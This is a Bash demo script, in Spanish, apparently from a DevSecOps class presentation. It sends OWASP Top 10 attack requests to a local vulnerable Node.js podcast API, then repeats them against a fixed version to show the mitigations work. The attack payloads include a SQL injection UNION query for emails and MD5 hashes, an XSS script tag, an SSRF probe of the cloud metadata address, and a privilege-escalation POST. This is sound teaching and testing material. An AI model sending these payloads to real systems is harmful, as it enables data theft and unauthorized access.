#!/bin/bash
TARGET="http://localhost:8081"
mkdir -p auditoria/fase1 auditoria/fase2
clear

echo "=========================================================="
echo "🛡️  PRESENTACIÓN DEVSECOPS - CASO 9: MEDIASTREAM (10 DOMINIOS)"
echo "=========================================================="
read -p "[PRESIONE ENTER PARA INICIAR LA FASE 1: API VULNERABLE]..."

echo -e "\n--- VECTOR A01 (Broken Access Control) ---"
curl -s -i -X POST --max-time 5 -H "Content-Type: application/json" -d '{"user_id": 99, "is_vip": true}' "$TARGET/api/user/upgrade"
read -p "-> [Presione ENTER para continuar]"

echo -e "\n--- VECTOR A02 (Cryptographic Failures) ---"
curl -s -i --max-time 5 "$TARGET/api/creator/profile"
read -p "-> [Presione ENTER para continuar]"

echo -e "\n--- VECTOR A03 (SQL Injection) ---"
curl -s -i --max-time 5 "$TARGET/api/podcasts/search?q=a%27%20UNION%20SELECT%20email,%20hash_md5--"
read -p "-> [Presione ENTER para continuar]"

echo -e "\n--- VECTOR A04 (Insecure Design) ---"
curl -s -i --max-time 5 "$TARGET/api/podcasts/download?id=EXCLUSIVO_VIP"
read -p "-> [Presione ENTER para continuar]"

echo -e "\n--- VECTOR A05 (Security Misconfiguration) ---"
curl -s -i --max-time 5 "$TARGET/api/dev/error"
read -p "-> [Presione ENTER para continuar]"

echo -e "\n--- VECTOR A06 (Vulnerable Components) ---"
curl -s -i --max-time 5 "$TARGET/api/system/decoder"
read -p "-> [Presione ENTER para continuar]"

echo -e "\n--- VECTOR A07 (Auth Failures) ---"
curl -s -i --max-time 5 "$TARGET/api/auth/recover?email=admin@streamvibe.com"
read -p "-> [Presione ENTER para continuar]"

echo -e "\n--- VECTOR A08 (XSS) ---"
curl -s -i -X POST --max-time 5 -H "Content-Type: application/json" -d '{"comment": "<script>alert(1)</script>"}' "$TARGET/api/comments/add"
read -p "-> [Presione ENTER para continuar]"

echo -e "\n--- VECTOR A09 (Logging & Monitoring) ---"
echo "[!] Verifique la consola del servidor Node.JS. NO se han generado logs de auditoría ante estos 8 ataques previos."
read -p "-> [Presione ENTER para continuar]"

echo -e "\n--- VECTOR A10 (SSRF) ---"
curl -s -i --max-time 5 "$TARGET/api/rss/import?url=http://169.254.169.254/latest/meta-data/"
echo -e "\n=========================================================="
echo "🛑 FASE 1 FINALIZADA. Detenga el servidor vulnerable y levante el seguro."
read -p "[PRESIONE ENTER CUANDO EL SERVIDOR SEGURO ESTÉ CORRIENDO]..."

echo -e "\n=========================================================="
echo "🛡️  INICIANDO FASE 2: VERIFICACIÓN DE MITIGACIÓN DE LOS 10 DOMINIOS"
echo "=========================================================="

echo -e "\n--- MITIGACIÓN A01 (Access Control) ---"
curl -s -i -X POST --max-time 5 -H "Content-Type: application/json" -d '{"is_vip": true}' "$TARGET/api/user/upgrade"
read -p "-> [Presione ENTER]"

echo -e "\n--- MITIGACIÓN A02 (Criptografía) ---"
curl -s -i --max-time 5 "$TARGET/api/creator/profile"
read -p "-> [Presione ENTER]"

echo -e "\n--- MITIGACIÓN A03 (SQLi) ---"
curl -s -i --max-time 5 "$TARGET/api/podcasts/search?q=UNION"
read -p "-> [Presione ENTER]"

echo -e "\n--- MITIGACIÓN A04 (Insecure Design) ---"
curl -s -i --max-time 5 "$TARGET/api/podcasts/download?id=EXCLUSIVO_VIP"
read -p "-> [Presione ENTER]"

echo -e "\n--- MITIGACIÓN A05 (Misconfiguration) ---"
curl -s -i --max-time 5 "$TARGET/api/dev/error"
read -p "-> [Presione ENTER]"

echo -e "\n--- MITIGACIÓN A06 (Componentes Seguros) ---"
curl -s -i --max-time 5 "$TARGET/api/system/decoder"
read -p "-> [Presione ENTER]"

echo -e "\n--- MITIGACIÓN A07 (Auth Secure UUID) ---"
curl -s -i --max-time 5 "$TARGET/api/auth/recover?email=admin@streamvibe.com"
read -p "-> [Presione ENTER]"

echo -e "\n--- MITIGACIÓN A08 (XSS Sanitizado) ---"
curl -s -i -X POST --max-time 5 -H "Content-Type: application/json" -d '{"comment": "<script>alert(1)</script>"}' "$TARGET/api/comments/add"
read -p "-> [Presione ENTER]"

echo -e "\n--- MITIGACIÓN A10 (SSRF Blocked) ---"
curl -s -i --max-time 5 "$TARGET/api/rss/import?url=http://169.254.169.254/latest/meta-data/"
read -p "-> [Presione ENTER]"

echo -e "\n--- MITIGACIÓN A09 (Logging & Monitoring) ---"
echo "[+] REVISE LA CONSOLA DEL SERVIDOR NODE.JS."
echo "[+] Todos los intentos acaban de quedar registrados con severidad, fecha, hora e IP (Log Audit)."
echo -e "\n=========================================================="
echo "🎉 PRESENTACIÓN FINALIZADA CON ÉXITO."